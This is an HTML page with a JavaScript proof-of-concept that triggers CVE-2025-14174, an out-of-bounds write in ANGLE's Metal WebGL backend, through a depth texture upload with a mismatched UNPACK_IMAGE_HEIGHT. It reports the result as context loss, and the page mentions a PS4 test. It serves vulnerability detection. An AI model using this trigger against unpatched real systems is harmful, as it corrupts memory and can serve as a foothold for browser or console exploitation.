<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CVE-2025-14174 Test ¬∑ Ps4 Test</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
        }
        body {
            background: #f1f4f8;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 30px 20px;
        }
        .card {
            max-width: 880px;
            width: 100%;
            background: white;
            border-radius: 32px;
            box-shadow: 0 20px 40px -12px rgba(0,20,40,0.25);
            overflow: hidden;
        }
        .header {
            background: #0b1e33;
            color: white;
            padding: 28px 32px;
        }
        .header h1 {
            margin: 0 0 6px 0;
            font-weight: 600;
            font-size: 2.2rem;
            letter-spacing: -0.01em;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .header h1 span {
            background: #d43f3f;
            font-size: 1rem;
            padding: 6px 14px;
            border-radius: 40px;
            font-weight: 500;
            letter-spacing: 0.3px;
        }
        .header p {
            margin: 0;
            opacity: 0.8;
            font-size: 1.1rem;
        }
        .content {
            padding: 32px;
        }
        .info-box {
            background: #eaf0fd;
            border-left: 6px solid #1a5cff;
            padding: 18px 22px;
            border-radius: 18px;
            margin-bottom: 28px;
            font-size: 0.98rem;
            line-height: 1.5;
            color: #102a4e;
        }
        .info-box strong {
            color: #0b1e33;
        }
        .badge {
            display: inline-block;
            background: #334e77;
            color: white;
            padding: 4px 12px;
            border-radius: 30px;
            font-size: 0.8rem;
            font-weight: 500;
            margin-right: 8px;
        }
        .platform-table {
            background: #f6f9ff;
            border-radius: 20px;
            padding: 18px;
            margin: 24px 0 18px;
            border: 1px solid #ccd9f0;
        }
        .platform-table table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.95rem;
        }
        .platform-table th {
            text-align: left;
            font-weight: 600;
            color: #0f2a4a;
            padding-bottom: 8px;
        }
        .platform-table td {
            padding: 8px 4px;
            border-bottom: 1px solid #d9e2f2;
        }
        .platform-table td:last-child {
            font-family: 'SF Mono', 'Fira Code', monospace;
        }
        .vuln-yes { color: #b13e3e; font-weight: 600; }
        .vuln-no { color: #2a7f3e; font-weight: 600; }
        .vuln-part { color: #b9781e; }

        .test-area {
            background: #f2f5fb;
            border-radius: 28px;
            padding: 26px;
            margin: 28px 0 16px;
        }
        .test-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 18px;
        }
        .test-header h2 {
            margin: 0;
            font-size: 1.6rem;
            font-weight: 550;
            color: #11263e;
        }
        .button {
            background: #1a5cff;
            border: none;
            color: white;
            font-weight: 600;
            font-size: 1.2rem;
            padding: 12px 36px;
            border-radius: 60px;
            cursor: pointer;
            box-shadow: 0 8px 18px rgba(26,92,255,0.3);
            transition: 0.15s;
            border: 1px solid rgba(255,255,255,0.2);
        }
        .button:hover {
            background: #0e4ad0;
            transform: scale(1.02);
            box-shadow: 0 12px 24px rgba(26,92,255,0.4);
        }
        .button:active {
            transform: scale(0.98);
        }
        .button:disabled {
            opacity: 0.5;
            pointer-events: none;
            background: #7e92b5;
        }
        .result-log {
            background: #0b1e33;
            color: #c7e0ff;
            padding: 20px;
            border-radius: 18px;
            font-family: 'SF Mono', 'Fira Code', monospace;
            font-size: 0.9rem;
            white-space: pre-wrap;
            word-break: break-word;
            max-height: 260px;
            overflow-y: auto;
            border: 1px solid #2a4170;
            margin-top: 24px;
        }
        .success { color: #8affb9; font-weight: 500; }
        .vuln { color: #ff9b9b; font-weight: 600; }
        .warn { color: #f9d77e; }
        .note {
            font-size: 0.9rem;
            color: #3b5277;
            margin-top: 20px;
            border-top: 1px dashed #b3c6e6;
            padding-top: 18px;
        }
        .footer {
            padding: 18px 32px 24px;
            background: #f8fafd;
            border-top: 1px solid #dbe4f0;
            font-size: 0.9rem;
            color: #2a4570;
        }
        .glow {
            background: #ffffffd6;
        }
    </style>
</head>
<body>
<div class="card">
    <div class="header">
        <h1>ANGLE WebGL <span style="background:#b02e2e;">CVE-2025-14174</span></h1>
        <p>Out‚Äëof‚Äëbounds write in ANGLE Metal backend ¬∑ WebGL2 depth texture + PBO + small UNPACK_IMAGE_HEIGHT</p>
    </div>

    <div class="content">
        <div class="info-box">
            <strong>‚ö†Ô∏è This page Is for a ps4 test for the vulnerability ‚Äì now patched in all major browsers.</strong> 
            It attempts to trigger the exact conditions and monitors for context loss or WebGL errors. 
            A positive result (context lost / crash) on an <strong>unpatched system</strong> indicates the bug is present. 
            Patched browsers handle the invalid parameters gracefully.
        </div>

        <div class="platform-table">
            <table>
                <tr><th>Platform / software</th><th>Vulnerable (if unpatched)</th><th>Notes</th></tr>
                <tr><td>iOS Safari / WebView</td><td class="vuln-yes">Yes</td><td>Uses ANGLE Metal</td></tr>
                <tr><td>macOS Chrome (all versions prior to 143.0.7499.110)</td><td class="vuln-yes">Yes</td><td>ANGLE Metal backend</td></tr>
                <tr><td>macOS Safari</td><td class="vuln-no">No</td><td>Native WebGL, not ANGLE</td></tr>
                <tr><td>macOS Electron apps (unpatched)</td><td class="vuln-yes">Yes</td><td>Inherit Chromium ANGLE</td></tr>
                <tr><td>Microsoft Edge (Chromium, pre‚Äëpatch)</td><td class="vuln-yes">Yes</td><td>Same as Chrome</td></tr>
                <tr><td>Linux / Windows Chrome</td><td class="vuln-part">Usually No</td><td>ANGLE backend different (not Metal)</td></tr>
                <tr><td>WebKitGTK / WPE (before 2.50.4)</td><td class="vuln-yes">Yes</td><td>ANGLE can be enabled</td></tr>
            </table>
            <p style="font-size:0.85rem; margin:12px 0 0;">* This test only reliably detects the issue on Apple GPUs via ANGLE Metal. Other configurations may not trigger.</p>
        </div>

        <div class="test-area">
            <div class="test-header">
                <h2>üß™ trigger test</h2>
                <button class="button" id="runTestBtn">run exploit condition</button>
            </div>

            <div id="log" class="result-log">
                ‚èµ Click "run exploit condition" to start.  
            </div>

            <div style="display: flex; gap: 16px; margin-top: 14px; align-items: center; flex-wrap: wrap;">
                <span class="badge">WebGL2 required</span>
                <span class="badge" style="background: #546e7a;">will not harm your system</span>
                <span style="margin-left: auto; color: #476b97;" id="agentDisplay"></span>
            </div>
        </div>

        <div class="note">
            <strong>üî¨ How the test works:</strong> 
            <ol style="margin: 6px 0 0 20px; line-height: 1.6;">
                <li>Create a WebGL2 context and set up a depth texture (format <code>DEPTH_COMPONENT24</code>).</li>
                <li>Allocate a PBO (pixel buffer object) with enough data for the full texture (64x64).</li>
                <li>Bind the PBO and set <code>UNPACK_IMAGE_HEIGHT = 1</code> (smaller than actual height).</li>
                <li>Call <code>texImage2D</code> with full height (64). On vulnerable ANGLE Metal, this writes out‚Äëof‚Äëbounds and likely crashes / loses context.</li>
                <li>Patched systems either ignore the inconsistency, throw a GL error, or handle it safely.</li>
            </ol>
        </div>
    </div>

    <div class="footer">
        ‚ìò This is a proof‚Äëof‚Äëconcept test for CVE‚Äë2025‚Äë14174, based on public analysis. 
        The bug was fixed in Chrome 143, WebKitGTK 2.50.4, and iOS / macOS updates. 
        No actual memory corruption is exploited ‚Äì the test only monitors context status.
    </div>
</div>

<script>
    (function() {
        const logDiv = document.getElementById('log');
        const runBtn = document.getElementById('runTestBtn');
        const agentSpan = document.getElementById('agentDisplay');
        agentSpan.textContent = navigator.userAgent;

        // Helper for logging
        function log(message, className = '') {
            const line = document.createElement('div');
            line.textContent = message;
            if (className) line.classList.add(className);
            logDiv.appendChild(line);
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        function clearLog() {
            logDiv.innerHTML = '';
        }

        // Context loss detection
        let contextLostFired = false;
        let contextRestoredFired = false;
        let testCompleted = false;
        let gl = null;
        let canvas = null;

        function handleContextLost(event) {
            event.preventDefault();
            contextLostFired = true;
            log('‚ö†Ô∏è CONTEXT LOST ‚Äî event fired!', 'vuln');
            // If test already completed, we might ignore; but we record anyway.
        }

        function handleContextRestored() {
            contextRestoredFired = true;
            log('üîÑ Context restored (after loss)', 'warn');
        }

        function cleanupContext() {
            if (gl) {
                const loseExt = gl.getExtension('WEBGL_lose_context');
                if (loseExt) loseExt.loseContext();
                gl = null;
            }
            if (canvas) {
                canvas.remove();
                canvas = null;
            }
            contextLostFired = false;
            contextRestoredFired = false;
        }

        function runTest() {
            clearLog();
            log('‚è≥ Starting test sequence...');

            // Ensure we have a fresh canvas/context
            cleanupContext();

            canvas = document.createElement('canvas');
            canvas.width = 64;
            canvas.height = 64;
            // hidden canvas, no need to attach

            // Attempt to get WebGL2 context
            let glOptions = { 
                alpha: false, 
                depth: true, 
                antialias: false,
                powerPreference: 'low-power' 
            };
            gl = canvas.getContext('webgl2', glOptions);
            if (!gl) {
                log('‚ùå WebGL2 not supported. This test requires WebGL2.', 'vuln');
                log('   (Your browser may be too old or does not support WebGL2)');
                cleanupContext();
                return;
            }

            log('‚úÖ WebGL2 context obtained.');

            // Attach context loss / restore listeners
            canvas.addEventListener('webglcontextlost', handleContextLost, false);
            canvas.addEventListener('webglcontextrestored', handleContextRestored, false);

            // Also request that the context tells us if it's already lost
            if (gl.isContextLost()) {
                log('‚ö†Ô∏è Context is already lost before test ‚Äì cannot proceed.', 'vuln');
                cleanupContext();
                return;
            }

            // ---- start actual trigger attempt ----
            const width = 64;
            const height = 64;
            const smallImageHeight = 1;   // UNPACK_IMAGE_HEIGHT set to 1

            // Create depth texture
            const texture = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, texture);
            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);

            // Create PBO (pixel unpack buffer) with enough data for full depth texture.
            // Use UNSIGNED_INT (4 bytes per pixel) for DEPTH_COMPONENT24.
            const dataSize = width * height * 4;  // 4 bytes per pixel
            const bufferData = new ArrayBuffer(dataSize);
            // Fill with zeros (could be any data)
            const view = new Uint8Array(bufferData);
            for (let i = 0; i < view.length; i++) view[i] = i % 256;  // just noise

            const pbo = gl.createBuffer();
            gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
            gl.bufferData(gl.PIXEL_UNPACK_BUFFER, bufferData, gl.STATIC_DRAW);

            log('üì¶ PBO created, size: ' + dataSize + ' bytes.');

            // Set UNPACK_IMAGE_HEIGHT to a smaller value (1) than the texture height (64)
            gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, smallImageHeight);
            // Also need to set UNPACK_ROW_LENGTH? Not required, but we set to default (0 = width)
            gl.pixelStorei(gl.UNPACK_ROW_LENGTH, 0);
            gl.pixelStorei(gl.UNPACK_SKIP_PIXELS, 0);
            gl.pixelStorei(gl.UNPACK_SKIP_ROWS, 0);

            log(`üîß UNPACK_IMAGE_HEIGHT set to ${smallImageHeight} (texture height is ${height}).`);

            // Clear previous errors
            while (gl.getError() !== gl.NO_ERROR) {}

            // Perform the texImage2D call that triggers the vulnerability.
            // internalFormat: DEPTH_COMPONENT24, format: DEPTH_COMPONENT, type: UNSIGNED_INT
            // data is null because PBO is bound.
            log('üöÄ Calling texImage2D with full height (64) ...');

            // Mark test as started
            testCompleted = false;
            let errorAfterCall = null;

            try {
                gl.texImage2D(
                    gl.TEXTURE_2D,          // target
                    0,                       // level
                    gl.DEPTH_COMPONENT24,     // internalformat
                    width,                    // width
                    height,                   // height
                    0,                        // border
                    gl.DEPTH_COMPONENT,        // format
                    gl.UNSIGNED_INT,           // type
                    0                          // offset in PBO
                );
            } catch (e) {
                log('‚ùó Exception thrown during texImage2D: ' + e, 'vuln');
                errorAfterCall = e;
            }

            // Immediately check GL error
            const err = gl.getError();
            if (err !== gl.NO_ERROR) {
                const errName = getGLErrorName(gl, err);
                log(`üî¥ WebGL error after texImage2D: ${errName} (0x${err.toString(16)})`, 'warn');
                errorAfterCall = errName;
            } else {
                log('‚úÖ No immediate GL error reported.', 'success');
            }

            // Check if context is already lost
            if (gl.isContextLost()) {
                log('üí• Context is lost immediately after texImage2D!', 'vuln');
                contextLostFired = true;  // mark for final result
            }

            // Force a flush to increase chance of GPU-side detection
            gl.flush();

            // Schedule final evaluation after a short delay to let context loss happen
            setTimeout(() => {
                evaluateResult();
            }, 300);

            function evaluateResult() {
                if (testCompleted) return;
                testCompleted = true;

                let finalVerdict = '';
                let vulnerable = false;

                // Check if context is lost now
                const lostNow = gl && gl.isContextLost();
                if (lostNow) {
                    log('üî• Context is lost (after delay) ‚Äî strong indicator of vulnerability.', 'vuln');
                    vulnerable = true;
                } else if (contextLostFired) {
                    log('üî• Context loss event was recorded ‚Äî system likely vulnerable.', 'vuln');
                    vulnerable = true;
                } else if (errorAfterCall) {
                    // Error might indicate patched system rejecting bad params
                    log('‚ö†Ô∏è GL error / exception occurred, but context is still alive. Possibly patched system.', 'warn');
                    vulnerable = false;
                } else {
                    // No error, no loss. Could be either patched or not triggering (e.g., wrong backend)
                    log('‚ÑπÔ∏è No context loss and no error. Test did not trigger crash.', '');
                    // Might still be vulnerable on some configurations? we set vulnerable = false for reporting
                    vulnerable = false;
                }

                // Additional check: if context was restored we note it
                if (contextRestoredFired) {
                    log('üîÅ Context restore event fired (vulnerability likely caused loss & recovery).');
                }

                // Provide a summary based on platform detection (user agent)
                const ua = navigator.userAgent;
                let platformNote = '';
                if (/iPhone|iPad|iPod/.test(ua) && !/Mac OS X 1[0-9]_/.test(ua)) { // iOS
                    platformNote = 'iOS device (uses ANGLE Metal)';
                } else if (/Mac OS X/.test(ua) && /Chrome/.test(ua) && !/Edg/.test(ua)) {
                    platformNote = 'macOS Chrome (ANGLE Metal)';
                } else if (/Mac OS X/.test(ua) && /Safari/.test(ua) && !/Chrome/.test(ua)) {
                    platformNote = 'macOS Safari (native WebGL, not vulnerable to this ANGLE bug)';
                } else if (/Windows|Linux/.test(ua)) {
                    platformNote = 'Windows/Linux (ANGLE backend likely not Metal)';
                }

                if (vulnerable) {
                    log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê', 'vuln');
                    log('üö®  LIKELY VULNERABLE (unpatched)   üö®', 'vuln');
                    log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê', 'vuln');
                    if (platformNote) log(`üìå Platform: ${platformNote}`);
                    log('‚ö†Ô∏è Update your browser/OS immediately if you haven‚Äôt.');
                } else {
                    log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê', 'success');
                    log('‚úÖ  NOT VULNERABLE or not triggered  ‚úÖ', 'success');
                    log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê', 'success');
                    if (platformNote) log(`üìå Platform: ${platformNote}`);
                    log('  - If you are on macOS Chrome/iOS and still see this, your browser is patched.');
                    log('  - For other platforms, the test may not be relevant.');
                }

                // Clean up: lose context to release resources (optional)
                const loseExt = gl.getExtension('WEBGL_lose_context');
                if (loseExt) loseExt.loseContext();
                gl = null; canvas = null;
            }
        }

        // Helper to translate WebGL error codes
        function getGLErrorName(gl, err) {
            switch (err) {
                case gl.INVALID_ENUM: return 'INVALID_ENUM';
                case gl.INVALID_VALUE: return 'INVALID_VALUE';
                case gl.INVALID_OPERATION: return 'INVALID_OPERATION';
                case gl.INVALID_FRAMEBUFFER_OPERATION: return 'INVALID_FRAMEBUFFER_OPERATION';
                case gl.OUT_OF_MEMORY: return 'OUT_OF_MEMORY';
                case gl.CONTEXT_LOST_WEBGL: return 'CONTEXT_LOST_WEBGL';
                default: return 'UNKNOWN_ERROR';
            }
        }

        runBtn.addEventListener('click', () => {
            runTest();
        });

        // Ensure cleanup on page unload
        window.addEventListener('beforeunload', () => {
            if (gl) {
                const loseExt = gl.getExtension('WEBGL_lose_context');
                if (loseExt) loseExt.loseContext();
            }
        });
    })();
</script>
</body>
</html>
